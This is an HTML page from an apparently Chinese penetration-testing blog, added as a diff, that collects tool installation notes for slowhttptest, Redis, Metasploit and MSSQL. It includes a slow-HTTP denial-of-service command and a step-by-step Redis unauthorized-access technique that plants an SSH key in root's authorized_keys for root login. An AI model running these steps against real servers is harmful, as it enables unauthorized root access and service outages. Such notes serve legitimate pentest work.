@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Be4r的博客">
+    <meta name="keyword"  content="Info Security">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        渗透测试中遇到的部分工具安装及问题解决——持续更新 - Be4r的博客 | Be4r&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> Be yourself </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>Be4r</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85slowhttptest"><span class="toc-text">安装slowhttptest</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8redis"><span class="toc-text">安装使用redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90"><span class="toc-text">使用redis未授权获取服务器权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E5%BB%BA%E7%AB%8B%E6%90%9C%E7%B4%A2%E7%BC%93%E5%AD%98"><span class="toc-text">msf建立搜索缓存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ubuntu18-04%E5%AE%89%E8%A3%85mssql"><span class="toc-text">Ubuntu18.04安装mssql</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> Be yourself </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        渗透测试中遇到的部分工具安装及问题解决——持续更新
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2018-10-18 16:35:14</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#Tools" title="Tools">Tools</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#Pantest" title="Pantest">Pantest</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <p>实际工作中会遇到一些问题，需要安装部分工具来协助工作的进行，以下内容记录了部分安装使用工具的命令教程汇总，有助于以后工作的便捷开展。</p>
+<a id="more"></a>
+
+
+<h2 id="安装slowhttptest"><a href="#安装slowhttptest" class="headerlink" title="安装slowhttptest"></a>安装slowhttptest</h2><ul>
+<li>git clone <a target="_blank" rel="noopener" href="https://github.com/shekyan/slowhttptest">https://github.com/shekyan/slowhttptest</a></li>
+<li>cd slowhttptest</li>
+<li>sudo ./configure</li>
+<li>如果出错，configure: error: OpenSSL-devel is missing，则执行apt-get install libssl-dev</li>
+<li>sudo make install</li>
+<li>使用命令：slowhttptest -c 5000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u <a target="_blank" rel="noopener" href="http://xxx.com/">http://xxx.com</a> -x 24 -p 3</li>
+</ul>
+<h2 id="安装使用redis"><a href="#安装使用redis" class="headerlink" title="安装使用redis"></a>安装使用redis</h2><ul>
+<li>wget <a target="_blank" rel="noopener" href="http://download.redis.io/releases/redis-4.0.9.tar.gz">http://download.redis.io/releases/redis-4.0.9.tar.gz</a></li>
+<li>tar xzf redis-4.0.9.tar.gz</li>
+<li>cd redis-4.0.9</li>
+<li>make</li>
+<li>src目录下 make install</li>
+<li>mkdir /usr/redis</li>
+<li>cp redis-server  /usr/redis</li>
+<li>cp redis-benchmark /usr/redis</li>
+<li>cp redis-cli  /usr/redis</li>
+<li>cp redis.conf  /usr/redis</li>
+<li>cd /usr/redis</li>
+<li>redis-server   redis.conf</li>
+<li>redis-cli</li>
+<li>gedit redis.conf配置daemonize yes（设置成后台服务），# requirepass foobared requirepass 123（指定密码123）</li>
+<li>启动redis服务：redis-server redis.conf</li>
+<li>redis远程连接：redis-cli -h 192.168.10.153</li>
+</ul>
+<h2 id="使用redis未授权获取服务器权限"><a href="#使用redis未授权获取服务器权限" class="headerlink" title="使用redis未授权获取服务器权限"></a>使用redis未授权获取服务器权限</h2><ul>
+<li>生成公私钥   ssh-keygen –t rsa</li>
+<li>将公钥写入foo.txt    (echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; foo.txt</li>
+<li>连接Redis写入文件     cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit</li>
+<li>redis-cli -h 192.168.1.11</li>
+<li>192.168.1.11:6379&gt; config set dir /root/.ssh/<br> OK</li>
+<li>192.168.1.11:6379&gt; config get dir<ol>
+<li>“dir”</li>
+<li>“/root/.ssh”</li>
+</ol>
+</li>
+<li>192.168.1.11:6379&gt; config set dbfilename “authorized_keys”<br> OK</li>
+<li>192.168.1.11:6379&gt; save<br> OK</li>
+<li>ssh -i id_rsa <a href="mailto:&#x72;&#111;&#111;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#49;&#46;&#x31;&#x31;">&#x72;&#111;&#111;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#49;&#46;&#x31;&#x31;</a></li>
+</ul>
+<h2 id="msf建立搜索缓存"><a href="#msf建立搜索缓存" class="headerlink" title="msf建立搜索缓存"></a>msf建立搜索缓存</h2><ul>
+<li>Metasploit 使用PostgreSQL作为数据库，所以必须先启PostgreSQL服务：service postgresql start</li>
+<li>执行成功后，可以通过ss -ant命令查看端口5432是否在侦听，去验证PostgreSQL服务是否成功开启。</li>
+<li>PostgreSQL运行后，我们需要去新建以及初始化msf数据库：msfdb init</li>
+<li>启动msfconsole然后使用命令db_status去验证数据库是否成功连接：<br>  msf &gt; db_status<br>  [*] postgresql connected to msf</li>
+<li>需要重新构建数据库缓存，在msf提示符下执行以下命令:<br>  msf &gt; db_rebuild_cache<br>  [*] Purging and rebuilding the module cache In the background..</li>
+<li>构建缓存会在后台运行，稍等几分钟后，重启msf控制台，即可使用搜索模块了</li>
+</ul>
+<h2 id="Ubuntu18-04安装mssql"><a href="#Ubuntu18-04安装mssql" class="headerlink" title="Ubuntu18.04安装mssql"></a>Ubuntu18.04安装mssql</h2><ul>
+<li>apt-get install -y libjemalloc1 libsss-nss-idmap0 libc++1 gawk curl</li>
+<li>curl <a target="_blank" rel="noopener" href="https://packages.microsoft.com/keys/microsoft.asc">https://packages.microsoft.com/keys/microsoft.asc</a> | apt-key add -</li>
+<li>add-apt-repository “$(curl <a target="_blank" rel="noopener" href="https://packages.microsoft.com/config/ubuntu/16.04/mssql-server-2017.list)&quot;">https://packages.microsoft.com/config/ubuntu/16.04/mssql-server-2017.list)&quot;</a></li>
+<li>add-apt-repository “$(curl <a target="_blank" rel="noopener" href="https://packages.microsoft.com/config/ubuntu/16.04/prod.list)&quot;">https://packages.microsoft.com/config/ubuntu/16.04/prod.list)&quot;</a></li>
+<li>wget <a target="_blank" rel="noopener" href="http://archive.ubuntu.com/ubuntu/pool/main/c/ca-certificates/ca-certificates_20160104ubuntu1_all.deb">http://archive.ubuntu.com/ubuntu/pool/main/c/ca-certificates/ca-certificates_20160104ubuntu1_all.deb</a></li>
+<li>dpkg -i ca-certificates_20160104ubuntu1_all.deb</li>
+<li>wget <a target="_blank" rel="noopener" href="http://archive.ubuntu.com/ubuntu/pool/main/o/openssl/openssl_1.0.2g-1ubuntu4_amd64.deb">http://archive.ubuntu.com/ubuntu/pool/main/o/openssl/openssl_1.0.2g-1ubuntu4_amd64.deb</a></li>
+<li>dpkg -i openssl_1.0.2g-1ubuntu4_amd64.deb</li>
+<li>apt install -y libcurl3</li>
+<li>apt-get update</li>
+<li>apt-get install -y mssql-server</li>
+</ul>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/R0mant1cBe4r">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a target="_blank" rel="noopener" href="https://expzh.com">Be4r&#39;s Page</a></span>
+        <span>/</span>
+        
+        <span><a href="#">It helps SEO</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
